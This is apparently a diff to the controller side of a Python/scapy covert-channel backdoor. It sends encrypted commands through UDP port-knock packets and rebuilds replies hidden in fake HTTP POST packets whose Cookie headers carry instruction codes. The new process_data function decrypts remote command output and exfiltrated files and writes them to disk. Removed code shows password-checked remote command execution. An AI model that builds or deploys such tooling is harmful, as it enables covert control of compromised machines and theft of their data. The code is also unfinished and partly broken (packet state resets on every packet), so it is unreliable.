@@ -131,6 +131,23 @@ def start_sender():
     :return: None
     """
 
+    # with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
+
+    # with open(file="/root/Desktop/write_test/cool_cat.bmp", mode='rb') as file:  # b is important -> binary
+    #     fileContent = file.read()
+    # filename = "test.bmp"
+    # print(f"type fileContent: {type(fileContent)}")
+    # ef = encryption.encrypt(fileContent).decode('utf-8')
+    # print(f"type encrypt: {type(encryption.encrypt(fileContent))}")
+    # print(f"type ef: {type(ef)}")
+    # sf = encryption.decrypt(ef.encode('utf-8'))
+    # print(f"type sf: {type(sf)}")
+    #
+    # with open(file=f"/root/Desktop/write_test/{filename}", mode='wb') as file:
+    #     file.write(sf)
+    #
+    # return
+
     # Generate encryption key if needed. Ensure both sender and receiver have same key.
     encryption.generate_key()
 
@@ -236,7 +253,7 @@ def start_sender():
 
 def start_sniff():
     print("Sniff started.")
-    sniff(prn=process_sniff_pkt, filter=f"host {config.receiver_address} tcp dst port {config.sender_port}",
+    sniff(prn=process_sniff_pkt, filter=f"src host {config.receiver_address} and tcp dst port {config.sender_port}",
           store=0)
 
 
@@ -251,11 +268,11 @@ def process_sniff_pkt(pkt):
     """
     global config
     global packet_list
-    packet_list = {}
+    packet_list = {"instruction": 0, "session_name": "", "session_total": 0}
 
-    ip_src = pkt.payload.src
-    print(ip_src)
-    if ip_src != config.receiver_address:
+
+    ip_dst = pkt.payload.dst
+    if ip_dst != config.sender_address:
         return
 
     # dst_port = pkt.payload.payload.dport
@@ -272,80 +289,151 @@ def process_sniff_pkt(pkt):
     #     print(f"Payload: {check_data.decode('utf-8')}")
     #     data = check_data.decode('utf-8')
 
-    print(f"Data: {data}")
+    if packet_list["instruction"] == 0:
+        if not data.startswith("POST"):
+            print("Received packet without POST instructions, dropping packet. POSSIBLE OUT OF ORDER.")
+            return
 
-    while True:
-        exit()
+    if data.startswith("POST"):
+        # instruction = (1-9), session_name = file name, session_total = total packets
+        packet_list = {"instruction": 0, "session_name": "", "session_total": 0}
 
-    if not data.startswith("POST"):
+        cookie = data.split("Cookie:")[1].split("Connection:")[0].strip()
+        instruction = cookie.split(",")[0].split("=")[1].strip()
+        session_name = cookie.split(",")[1].split("=")[1].strip()
+        session = str(int(cookie.split(",")[2].split("=")[1].strip()))
+        content = data.split("Content-Length: ")[1].split(maxsplit=1)[1].strip()
+        print(instruction)
+        print(f"session_name: {session_name}")
+        print(session)
+        print(content)
+        session_current = 1
+        session_total = session
+        print(f"session_current: {session_current}")
+        print(f"session_total: {session_total}")
+
+        packet_list["instruction"] = instruction
+        packet_list["session_name"] = session_name
+        packet_list["session_total"] = session_total
+        packet_list[session_current] = content
+    else:
+        s_data = data.strip().rsplit(config.delimiter)
+        content = s_data[0]
+        session_current = str(int(s_data[1]))
+        packet_list[session_current] = content
+
+    print(f"len of packet list= {len(packet_list)}")
+    print(packet_list)
+    if len(packet_list) - 3 >= int(packet_list["session_total"]):
+        complete_data = ""
+        for idx in range(len(packet_list) - 3):
+            complete_data += packet_list[str(idx+1)]
+
+        process_data(packet_list["instruction"], complete_data, packet_list["session_name"])
+    else:
         return
+
+
 
     # slice out packet_start
-    s_data = data[4:]
-    decrypt_cmd = ""
-    commands = []
-    try:
-        print(f"Encrypted Cmd: {s_data}")
-        decrypt_cmd = encryption.decrypt(s_data.encode('utf-8')).decode('utf-8')
-        print(f"Cmd: {decrypt_cmd}")
-        commands = decrypt_cmd.split(config.delimiter)
-    except:
-        print(f"Decryption Failed:\n{decrypt_cmd}")
-
-    print(commands)
-    one_time_password = config.port_knock_password_base + config.port_knock_password_seq_num
-    packet_password = commands[0]
-    order = commands[1]
-    print(len(commands))
-    if len(commands) > 2:
-        instruction = commands[2]
-    if len(commands) > 3:
-        instruction_input = commands[3]
-
-    if one_time_password != packet_password:
-        print(f"Password Don't Match!\n{one_time_password}\n{packet_password}")
-        return
-    print(f"Password Matched!\n{one_time_password}\n{packet_password}")
-
-    if order == "1/1":
-        instruction = commands[2]
-        if instruction == "1":
-            print(instruction)
-        elif instruction == "2":
-            print(instruction)
-        elif instruction == "3":
-            instruction_input = commands[3]
-            print(instruction)
-            print(instruction_input)
-            result = run_commands(instruction_input)
-            # encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
-            # send_command_output(encrypted_data, address, sender_port)
-        elif instruction == "4":
-            instruction_input = commands[3]
-            print(instruction)
-            print(instruction_input)
-        elif instruction == "5":
-            instruction_input = commands[3]
-            print(instruction)
-            print(instruction_input)
-        elif instruction == "6":
-            print(instruction)
-        elif instruction == "7":
-            instruction_input = commands[3]
-            print(instruction)
-            print(instruction_input)
-        elif instruction == "8":
-            print(instruction)
-        elif instruction == "9":
-            print(instruction)
-        else:
-            print(f"WARNING, invalid instruction: {instruction}.")
-
-    return
+    # s_data = data[4:]
+    # decrypt_cmd = ""
+    # commands = []
+    # try:
+    #     print(f"Encrypted Cmd: {s_data}")
+    #     decrypt_cmd = encryption.decrypt(s_data.encode('utf-8')).decode('utf-8')
+    #     print(f"Cmd: {decrypt_cmd}")
+    #     commands = decrypt_cmd.split(config.delimiter)
+    # except:
+    #     print(f"Decryption Failed:\n{decrypt_cmd}")
+    #
+    # print(commands)
+    # one_time_password = config.port_knock_password_base + config.port_knock_password_seq_num
+    # packet_password = commands[0]
+    # order = commands[1]
+    # print(len(commands))
+    # if len(commands) > 2:
+    #     instruction = commands[2]
+    # if len(commands) > 3:
+    #     instruction_input = commands[3]
+    #
+    # if one_time_password != packet_password:
+    #     print(f"Password Don't Match!\n{one_time_password}\n{packet_password}")
+    #     return
+    # print(f"Password Matched!\n{one_time_password}\n{packet_password}")
+    #
+    # if order == "1/1":
+    #     instruction = commands[2]
+    #     if instruction == "1":
+    #         print(instruction)
+    #     elif instruction == "2":
+    #         print(instruction)
+    #     elif instruction == "3":
+    #         instruction_input = commands[3]
+    #         print(instruction)
+    #         print(instruction_input)
+    #         result = run_commands(instruction_input)
+    #         # encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
+    #         # send_command_output(encrypted_data, address, sender_port)
+    #     elif instruction == "4":
+    #         instruction_input = commands[3]
+    #         print(instruction)
+    #         print(instruction_input)
+    #     elif instruction == "5":
+    #         instruction_input = commands[3]
+    #         print(instruction)
+    #         print(instruction_input)
+    #     elif instruction == "6":
+    #         print(instruction)
+    #     elif instruction == "7":
+    #         instruction_input = commands[3]
+    #         print(instruction)
+    #         print(instruction_input)
+    #     elif instruction == "8":
+    #         print(instruction)
+    #     elif instruction == "9":
+    #         print(instruction)
+    #     else:
+    #         print(f"WARNING, invalid instruction: {instruction}.")
+    #
+    # return
 
     # Instruction only stored in first packet
     # If multi-packet, save to packet_list dictionary style 1:data, 2:data
 
+
+def process_data(instruction, data, filename=""):
+
+    if instruction == "1":
+        print(instruction)
+    elif instruction == "2":
+        print(instruction)
+    elif instruction == "3":
+        print(f"Instruction: {instruction}")
+        decrypted_data = encryption.decrypt(data.encode('utf-8')).decode('utf-8')
+        with open(file=f"/root/Desktop/write_test/{LOG_PATH}", mode='a') as file:
+            file.write(decrypted_data)
+        print(f"Output: /root/Desktop/write_test/{LOG_PATH}")
+    elif instruction == "4":
+        print(f"Instruction: {instruction}")
+        # print(data)
+        decrypted_data = encryption.decrypt(data.encode('utf-8')).decode('utf-8')
+        # print(decrypted_data)
+        with open(file=f"/root/Desktop/write_test/{filename}", mode='wb') as file:
+            file.write(decrypted_data)
+        print(f"Output: /root/Desktop/write_test/{filename}")
+    elif instruction == "5":
+        print(instruction)
+    elif instruction == "6":
+        print(instruction)
+    elif instruction == "7":
+        print(instruction)
+    elif instruction == "8":
+        print(instruction)
+    elif instruction == "9":
+        print(instruction)
+    else:
+        print(f"WARNING, invalid instruction: {instruction}.")
 
 
 
@@ -387,7 +475,7 @@ def send_port_knock(command):
         port_knock1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
         send(port_knock1, verbose=0)
     else:
-        parts = textwrap.wrap(command)
+        parts = textwrap.wrap(command, 240)
 
         for idx, part in enumerate(parts):
             packet_order = f"{delimiter}{idx}/{len(parts)}"
@@ -399,7 +487,7 @@ def send_port_knock(command):
                       "is truncated.")
                 port_knock2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
                 send(port_knock2, verbose=0)
-        print("Warning, payload in port knock packet exceeding 500 bytes, may not decrypt if payload truncated.")
+        # print("Warning, payload in port knock packet exceeding 500 bytes, may not decrypt if payload truncated.")
 
 
     # Port-knocking 3 UDP ports with Auth keyword as payload. Include command at end of last packet payload.
